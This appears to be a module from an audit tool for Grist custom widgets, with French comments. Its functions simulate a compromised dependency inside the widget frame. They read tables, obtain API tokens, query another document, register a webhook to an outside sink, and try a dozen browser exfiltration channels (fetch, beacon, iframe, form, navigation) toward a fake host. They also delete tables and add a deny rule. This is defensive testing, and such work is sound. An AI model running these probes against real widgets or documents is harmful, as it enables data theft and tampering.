/**
 * Le « kit de la dépendance piégée » : ce que ferait, avec le niveau d'accès réellement accordé au widget, du code étranger qui
 * s'exécute DANS le cadre du widget (une bibliothèque dont le mainteneur est piraté, un CDN compromis). Il est joué par `evaluate`
 * dans le cadre du widget chargé par le vrai Grist : même contexte JavaScript que le widget, mêmes droits, même politique de
 * sécurité (CSP) pour ses appels réseau, qu'une bibliothèque piégée subirait elle aussi.
 *
 * Il ne fait que des essais mesurables, sur l'instance jetable : lire (liste des tables, table appât, tables système), demander un
 * jeton d'accès, appeler l'API du document avec ce jeton (liste des tables, SQL, un AUTRE document de l'instance), tenter de créer
 * un webhook. Aucune écriture dans les données, aucune destruction. Il ne rend que des faits (jamais le jeton lui-même).
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{appat: string, table: string, prefixe: string, autreDoc: string|null, canariAutre: string|null, puits: string}} p
 */
export async function kitDependancePiegee(p) {
  const fin = Date.now() + 20_000;
  const court = (m) => String((m && m.message) || m).replace(/\s+/g, ' ').slice(0, 200);
  const avec = (promesse) => Promise.race([promesse, new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), Math.max(1000, Math.min(6000, fin - Date.now()))))]);
  const essayer = async (f) => { try { return { ok: true, ...(await avec(f())) }; } catch (e) { return { ok: false, erreur: court(e) }; } };

  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => { if (violations.length < 5) violations.push(`${e.violatedDirective} ${String(e.blockedURI).slice(0, 80)}`); });
  const sortie = { grist: !!(window.grist && window.grist.docApi), violations };
  if (!sortie.grist) return sortie;

  const lire = (id) => essayer(async () => {
    const t = await window.grist.docApi.fetchTable(id);
    const cles = Object.keys(t || {});
    return { colonnes: cles.length, lignes: cles.length ? (t[cles[0]] || []).length : 0, canari: JSON.stringify(t).includes(p.prefixe) };
  });
  sortie.tables = await essayer(async () => ({ nombre: (await window.grist.docApi.listTables()).length }));
  sortie.appat = await lire(p.appat);
  sortie.systeme = {};
  for (const t of ['_grist_Tables_column', '_grist_ACLRules', '_grist_Views_section']) sortie.systeme[t] = await lire(t);

  const jeton = async (readOnly) => {
    let j = null;
    const r = await essayer(async () => { j = await window.grist.docApi.getAccessToken({ readOnly }); return { dureeMs: j.ttlMs }; });
    return { r, j };
  };
  const appeler = (methode, url, corps) => essayer(async () => {
    const r = await fetch(url, { method: methode, headers: corps ? { 'content-type': 'application/json' } : {}, body: corps ? JSON.stringify(corps) : undefined });
    const texte = await r.text();
    let json = null; try { json = JSON.parse(texte); } catch { /* corps non JSON */ }
    return { statut: r.status, erreurGrist: json && typeof json.error === 'string' ? json.error.slice(0, 120) : null, texte: texte.slice(0, 20000) };
  });
  const sansTexte = (r) => { const { texte, ...reste } = r; return reste; };

  const lecture = await jeton(true);
  sortie.jetonLecture = lecture.r;
  if (lecture.j) {
    const { token, baseUrl } = lecture.j;
    const auth = `?auth=${encodeURIComponent(token)}`;
    const tables = await appeler('GET', `${baseUrl}/tables${auth}`);
    sortie.tablesRest = { ...sansTexte(tables), cite: tables.ok && tables.statut === 200 && tables.texte.includes(p.table) };
    const sql = await appeler('POST', `${baseUrl}/sql${auth}`, { sql: 'select id, tableId from _grist_Tables' });
    sortie.sql = { ...sansTexte(sql), cite: sql.ok && sql.statut === 200 && sql.texte.includes(p.table) };
    if (p.autreDoc) {
      const autre = await appeler('GET', `${baseUrl.replace(/\/docs\/[^/]+$/, `/docs/${p.autreDoc}`)}/tables${auth}`);
      sortie.autreDoc = { ...sansTexte(autre), canari: autre.ok && !!p.canariAutre && autre.texte.includes(p.canariAutre) };
    }
  }

  const ecriture = await jeton(false);
  sortie.jetonEcriture = ecriture.r;
  if (ecriture.j) {
    const { token, baseUrl } = ecriture.j;
    const auth = `?auth=${encodeURIComponent(token)}`;
    const w = await appeler('POST', `${baseUrl}/webhooks${auth}`, { webhooks: [{ fields: { name: 'gwaudit', url: p.puits, enabled: true, eventTypes: ['add', 'update'], tableId: p.table } }] });
    const id = w.ok && w.statut === 200 && /"id"\s*:\s*"/.test(w.texte) ? (w.texte.match(/"id"\s*:\s*"([^"]+)"/) || [])[1] : null;
    sortie.webhook = { ...sansTexte(w), cree: !!id };
    if (id) {
      const liste = await appeler('GET', `${baseUrl}/webhooks${auth}`);
      sortie.webhook.listeContientLeWebhook = liste.ok && liste.texte.includes(id);
    }
  }
  return sortie;
}

/**
 * Les canaux de sortie : par quelles voies du navigateur du code étranger, qui s'exécute dans le cadre du widget, pourrait envoyer ce qu'il
 * a lu vers un hôte extérieur. Chaque voie est tentée une fois, vers un hôte factice que l'audit intercepte (rien ne sort de la machine),
 * avec un marqueur unique dans l'adresse : l'audit voit côté réseau quelles tentatives ont abouti, et ici quelles tentatives la politique de
 * sécurité (CSP) du widget a arrêtées. Jouée dans une passe à part : ces requêtes ne se mêlent pas à celles du widget (essai 13).
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{hote: string, prefixe: string}} p
 */
export async function kitCanaux(p) {
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => { if (violations.length < 60) violations.push({ directive: e.violatedDirective, bloque: String(e.blockedURI).slice(0, 200) }); });
  const marque = (nom) => `${p.prefixe}-CANAL-${nom.toUpperCase()}`;
  // Un sous-domaine par voie : Chromium ne rapporte que l'origine d'un cadre bloqué, le nom de la voie doit s'y lire.
  const url = (nom) => `https://${nom}.${p.hote}/c?d=${marque(nom)}`;
  const racine = () => document.body || document.documentElement;
  const tete = () => document.head || document.documentElement;
  const tentatives = {};
  const reseau = {};
  const essayer = (nom, f) => {
    try { const r = f(); if (r && typeof r.catch === 'function') r.catch(() => {}); tentatives[nom] = 'lancee'; }
    catch (e) { tentatives[nom] = `exception : ${String((e && e.message) || e).slice(0, 100)}`; }
  };
  const lier = (nom, rel) => { const l = document.createElement('link'); l.rel = rel; l.href = url(nom); tete().appendChild(l); };

  essayer('fetch', () => fetch(url('fetch'), { mode: 'no-cors' }));
  essayer('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', url('xhr')); x.send(); });
  essayer('image', () => { new Image().src = url('image'); });
  essayer('beacon', () => navigator.sendBeacon(url('beacon'), marque('beacon')));
  // Vraie WebSocket (la passe n'intercepte pas celles-ci : l'interception de Playwright les soustrait à la CSP) : si aucune CSP ne l'arrête, la connexion est tentée puis échoue faute de DNS.
  essayer('websocket', () => { const w = new WebSocket(url('websocket').replace(/^https/, 'wss')); w.onerror = () => { reseau.websocket = 'tentative'; }; w.onclose = () => { reseau.websocket = reseau.websocket || 'tentative'; }; });
  essayer('script', () => { const s = document.createElement('script'); s.src = url('script'); tete().appendChild(s); });
  essayer('iframe', () => { const f = document.createElement('iframe'); f.hidden = true; f.src = url('iframe'); racine().appendChild(f); });
  essayer('feuille', () => lier('feuille', 'stylesheet'));
  essayer('cssurl', () => { const d = document.createElement('div'); d.style.cssText = `width:1px;height:1px;background-image:url("${url('cssurl')}")`; racine().appendChild(d); });
  essayer('prefetch', () => lier('prefetch', 'prefetch'));
  essayer('formulaire', () => {
    const cadre = document.createElement('iframe'); cadre.name = 'gw_canal_formulaire'; cadre.hidden = true; racine().appendChild(cadre);
    const f = document.createElement('form'); f.method = 'POST'; f.action = url('formulaire'); f.target = 'gw_canal_formulaire';
    const i = document.createElement('input'); i.name = 'd'; i.value = marque('formulaire'); f.appendChild(i); racine().appendChild(f); f.submit();
  });
  await new Promise((r) => setTimeout(r, 2000));
  // En dernier : la navigation du cadre lui-même vers l'extérieur (aucune CSP ne la ferme).
  essayer('navigation', () => { location.replace(url('navigation')); });
  await new Promise((r) => setTimeout(r, 800));
  return { tentatives, violations, reseau };
}

/**
 * Les écritures : ce que du code étranger dans le cadre du widget pourrait changer dans le document avec le niveau d'accès accordé. Chaque
 * effet vise sa propre table sacrifiée (voir TABLES_SACRIFIEES dans donnees.js) ; l'audit vérifie ensuite côté serveur ce qui a changé, il ne
 * croit pas ce que cette fonction rapporte. L'écriture d'une règle d'accès est la dernière : Grist recharge alors la page, le cadre disparaît et
 * `evaluate` échoue : c'est attendu.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{ajout: string, renom: string, colonne: string, table: string, regle: string}} p identifiants des tables sacrifiées
 */
export async function kitEcritures(p) {
  const court = (m) => String((m && m.message) || m).replace(/\s+/g, ' ').slice(0, 200);
  const sortie = { grist: !!(window.grist && window.grist.docApi) };
  if (!sortie.grist) return sortie;
  const agir = async (actions) => {
    try { await Promise.race([window.grist.docApi.applyUserActions(actions), new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), 8000))]); return { ok: true }; }
    catch (e) { return { ok: false, erreur: court(e) }; }
  };
  sortie.ajout = await agir([['AddRecord', p.ajout, null, { Valeur: 'ajout-audit', Autre: 'x' }]]);
  sortie.renom = await agir([['RenameColumn', p.renom, 'Valeur', 'ValeurRenommee']]);
  sortie.colonne = await agir([['RemoveColumn', p.colonne, 'Autre']]);
  sortie.table = await agir([['RemoveTable', p.table]]);
  sortie.regle = await agir([['AddRecord', '_grist_ACLResources', -1, { tableId: p.regle, colIds: '*' }], ['AddRecord', '_grist_ACLRules', null, { resource: -1, aclFormula: '', permissionsText: '-R', rulePos: 100 }]]);
  return sortie;
}

/**
 * Les droits du navigateur donnés au cadre du widget : ce que la politique d'autorisations (Permissions-Policy) de Chromium laisse faire à du
 * code étranger dans ce cadre (caméra, micro, position, partage d'écran, presse-papier…). La politique est celle que Grist fixe par l'attribut
 * `allow` du cadre, rétrécie au besoin par les en-têtes du widget : c'est la politique réellement appliquée, lue dans le cadre.
 * Pour le presse-papier, l'essai va jusqu'au bout : après un vrai clic dans le widget (fait par l'audit, voir `poserSurfaceDeClic`), le cadre écrit
 * un texte de test, que l'audit relit depuis la page Grist. La lecture du presse-papier par le cadre n'est pas tentée : la politique dit si Grist la lui délègue.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{marqueur: string}} p texte de test écrit par le cadre
 */
export async function kitDroits(p) {
  const court = (m) => String((m && m.message) || m).replace(/\s+/g, ' ').slice(0, 220);
  const avec = (promesse) => Promise.race([promesse, new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), 4000))]);
  const sortie = { activation: !!(navigator.userActivation && navigator.userActivation.isActive), politique: null, connues: null };
  const pol = document.permissionsPolicy || document.featurePolicy;
  try { if (pol && typeof pol.allowedFeatures === 'function') { sortie.politique = pol.allowedFeatures().map(String).sort(); sortie.connues = typeof pol.features === 'function' ? pol.features().map(String).sort() : null; } }
  catch (e) { sortie.erreurPolitique = court(e); }
  const essayer = async (f) => { try { return { ok: true, ...(await avec(f())) }; } catch (e) { return { ok: false, erreur: court(e) }; } };
  if (!navigator.clipboard) return { ...sortie, ecriture: { ok: false, erreur: 'navigator.clipboard absent' } };
  sortie.ecriture = await essayer(async () => { await navigator.clipboard.writeText(p.marqueur); return {}; });
  return sortie;
}

/**
 * Pose, dans le cadre du widget, une petite surface transparente en haut à gauche, par-dessus tout : le clic réel que fait ensuite l'audit tombe
 * sur elle et non sur un bouton du widget, qu'il ne déclenche donc pas. Rend la place disponible dans le cadre.
 */
export function poserSurfaceDeClic() {
  const d = document.createElement('div');
  d.style.cssText = 'position:fixed;left:0;top:0;width:12px;height:12px;opacity:0;z-index:2147483647';
  (document.body || document.documentElement).appendChild(d);
  return { largeur: window.innerWidth, hauteur: window.innerHeight };
}
